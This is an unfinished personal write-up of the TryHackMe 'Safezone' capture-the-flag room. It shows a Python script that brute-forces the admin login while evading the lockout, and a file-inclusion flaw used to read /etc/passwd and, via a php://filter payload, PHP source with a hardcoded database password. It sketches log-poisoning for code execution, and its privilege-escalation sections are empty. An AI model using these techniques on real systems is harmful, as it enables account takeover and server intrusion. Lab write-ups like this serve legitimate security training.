# Tryhackme.com Room : Safezone

`https://tryhackme.com/room/safezone

## Instance

```bash
export IP="10.10.152.209"
```

## Nmap

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:6a:cd:1b:0c:69:a1:3b:6c:52:f1:22:93:e0:ad:16 (RSA)
|   256 84:f4:df:87:3a:ed:f2:d6:3f:50:39:60:13:40:1f:4c (ECDSA)
|_  256 9c:1e:af:c8:8f:03:4f:8f:40:d5:48:04:6b:43:f5:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Whoami?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Foothold

We have a static webpage with nothing interesting on it. 

Let's run `gobuster` to see if we can find something



Actually, when we look at `/index.php` we are greeted with a login form

We can register using `/register.php`



There is a bunch of hints in there.



In html comments on `/detail.php` :

```
try to use "page" as GET parameter
```

On `/news.php` :

```
I have something to tell you , it's about LFI or is it RCE or something else?
```

Hmmm.. been looking around for a little while. Can't find anything usefull.

Tried fuzzing the `?page` parameter but didn't get any hits



Tried to include some php using the `user` field. The php is not executed



There is a `/note.txt` file 

```
Message from admin :-

		I can't remember my password always , that's why I have saved it in /home/files/pass.txt file .
```



Soo after fuzzing the `page` parameter for a while, I had a look at a write up to get some hints.

Apparently there is an `Apache` settings that allow the access to the `home` directory  using `/~[USER]/`



We can retrieve the `/home/files/pass.txt` file by visiting `/~files/pass.txt`

```
Admin password hint :-

		admin__admin

				" __ means two numbers are there , this hint is enough I think :) "
```

Soo, seems like we need to bruteforce the admin password ?

Although, in our exploration phase we registered an `admin` account, hopefully this won't interfere..



Hmmm also, we see that there is a rate limiting. When we enter 3 times the wrong password we get locked out for 60 secs.



Seems like we can go around this constraint by logging into a valid account between our trials.



Crafted this little python script to retrieve the password :

```python
import requests

# Need to have registred a user with creds user:password before running this script
def valid_login(sess):
	sess.post('http://safezone.thm/index.php', data={
		'username': 'user',
		'password': 'password',
		'submit': 'Submit'
	})

	sess.get('http://safezone.thm/logout.php')


def try_comb(sess, user='koko', passwd='koko'):
	resp = sess.post('http://safezone.thm/index.php', data={
		'username': user,
		'password': passwd,
		'submit': 'Submit'
	}).content.decode()

	return 'window.location.href' in resp


s = requests.Session()

trying = 0

while trying < 100:
	passwd = f"admin{trying:02d}admin"

	print(f"Trying password : {passwd}")

	is_valid = try_comb(s, user='admin', passwd=passwd)

	if is_valid:
		print(f"\nFound valid password : {passwd}")
		break

	# Reset login attemps
	valid_login(s)

	trying += 1

print("Done")
```



We find that the admin password is 

```
admin44admin
```



We can then login as admin and we see a form on `/detail.php` called `whoami`

When we enter a username, we get the user infos :

```
{"id":"551","username":"admin","password":"admin44admin","is_admin":"true"}
```



I was fiddling with the `?page` parameter still and I saw that some stuff were printed when i was doing a `whoami` request with the `?page` parameter. Tried with `?page=/etc/passwd` and we got the content of the file :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
files:x:1001:1001:,,,:/home/files:/bin/bash
```



We see that we have users named `yash` , `files` and `root` with shells



Tried to access files in `/home/yash` to retrieve an ssh key but seems like we don't have access (tried retrieving the content of `.bashrc`)

We are probably running this as `www-data` so we don't have access.



didn't find any usefull infos in `/etc/ssh/sshd_config` 

Can't read `/etc/shadow`

Hmm, what file can we retrieve to get a foothold in the box ?



I retrieved the code for the php page using `/detail.php?page=php://filter/convert.base64-encode/resource=/var/www/html/detail.php`

```php
<?php
$con=mysqli_connect("localhost","root","myrootpass","db");
session_start();
if(isset($_SESSION['IS_LOGIN']))
{
$is_admin=$_SESSION['isadmin'];
echo "<h2 style='color:Tomato;margin-left:100px;margin-top:-80px'>Find out who you are :) </h2>";
echo "<br><br><br>";
if($is_admin==="true")
{
echo '<div style="align:center;" class="divf">';
echo '<form class="box" method="POST" style="text-align:center">';
echo '<input required AUTOCOMPLETE="OFF" style="text-align:center;" type="text" placeholder="user" name="name"><br><br>';
echo '<input type="submit" value="whoami" name="sub">';
echo '</form>';
echo '</div>';
if(isset($_GET["page"]))
{
                $page=$_GET["page"];
                $file = str_replace(array( "../", "..\"" ), "", $page );
                echo $file;
                include($file);
}
$formuser=mysqli_real_escape_string($con,$_POST['name']);
if(isset($_POST['sub']))
        {
                $sql="select * from user where username='$formuser'";
                $details = mysqli_fetch_assoc(mysqli_query($con,$sql));
                $det=json_encode($details);
                echo "<pre style='color:red;font-size:14px'>$det</pre>";
                $msg="Details are saved in a file";
                echo "<script>alert('details saved in a file')</script>";
        }
}
else
{
echo "<h3 style='color:red;text-align:center'>You can't access this feature!'</h3>";
}
}
else
{
header('Location: index.php');
}

?>
```

We confirm the lfi and we see that we don't need the post request to trigger the lfi, the text is just black on black.



Don't think we can do much with the `whoami` request. The parameter is escaped so no sql injection.



A way to get RCE is to include `/var/log/apache2/access.log` and include rce code by using our useragent.

Unfortunately, the access log was already polluted by our gobuster and nikto scan. So let's just restart the box to clear it out and insert an rce payload.





## Priv esc



## Follow up



## End

